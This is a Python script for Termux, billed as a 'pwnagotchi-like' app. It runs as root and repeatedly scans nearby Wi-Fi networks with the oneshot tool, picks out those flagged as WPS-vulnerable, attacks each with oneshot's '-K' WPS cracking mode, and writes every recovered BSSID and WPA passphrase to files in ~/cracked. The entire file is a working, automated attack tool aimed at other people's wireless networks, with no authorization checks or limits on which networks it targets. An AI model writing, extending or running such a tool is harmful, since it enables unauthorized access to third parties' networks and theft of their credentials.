#!/usr/bin/env python3
"""
pwnagotchi-like Termux app (text-based)
- Uses `sudo oneshot -i wlan0` to discover Wi-Fi networks
- Parses output for green-highlighted vulnerable networks
- Cracks WPS with `sudo oneshot -i wlan0 -b <BSSID> -K`
- Tracks total scanned and cracked
- Logs each cycle with simple text output
"""
import os
import sys
import subprocess
import time
import re
from datetime import datetime

INTERFACE = os.environ.get('WIFI_INTERFACE', 'wlan0')
CRACKED_DIR = os.path.expanduser('~/cracked')
SCAN_INTERVAL = 5
ATTACK_TIMEOUT = 10
ONESHOT_CMD = 'oneshot'

os.makedirs(CRACKED_DIR, exist_ok=True)

# Run oneshot scan
def get_vulnerable_bssids():
    try:
        result = subprocess.run(
            ['sudo', ONESHOT_CMD, '-i', INTERFACE],
            capture_output=True, text=True, timeout=20
        ).stdout
    except Exception:
        return []

    bssids = []
    for line in result.splitlines():
        if '\x1b[32m' in line or '[+]' in line:  # likely vulnerable, green-colored or marked
            match = re.search(r'BSSID\s*:\s*([0-9A-Fa-f:]{17})', line)
            if match:
                bssids.append(match.group(1))
    return list(dict.fromkeys(bssids))

# Run attack
def attack_bssid(bssid):
    try:
        proc = subprocess.run(
            ['sudo', ONESHOT_CMD, '-i', INTERFACE, '-b', bssid, '-K'],
            capture_output=True, text=True, timeout=ATTACK_TIMEOUT
        )
        return proc.stdout + proc.stderr
    except subprocess.TimeoutExpired:
        return ''

# Parse output
def parse_psks(output):
    return re.findall(r'PSK:\s*(\S+)', output)

def save_crack(bssid, psk):
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"{ts}_{bssid.replace(':','')}.txt"
    with open(os.path.join(CRACKED_DIR, filename), 'w') as f:
        f.write(f"BSSID: {bssid}\nPSK: {psk}\n")

def main():
    if os.geteuid() != 0:
        print("[!] Please run as root (tsu)")
        sys.exit(1)

    cycle = 0
    total_scanned = 0
    total_cracked = 0

    print("[+] Pwnagotchi-Termux starting...")

    while True:
        cycle += 1
        ts = datetime.now().strftime('%H:%M:%S')

        bssids = get_vulnerable_bssids()
        scanned_now = len(bssids)
        total_scanned += scanned_now

        cracked_now = 0
        for bssid in bssids:
            output = attack_bssid(bssid)
            psks = parse_psks(output)
            if psks:
                cracked_now += len(psks)
                for psk in psks:
                    save_crack(bssid, psk)

        total_cracked += cracked_now
        mood = '^_^' if cracked_now else '-_-'        
        print(f"[{ts}] Cycle {cycle} | Found: {scanned_now} | Cracked: {cracked_now} => Total: {total_scanned} / {total_cracked} {mood}")
        time.sleep(SCAN_INTERVAL)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Exiting...")
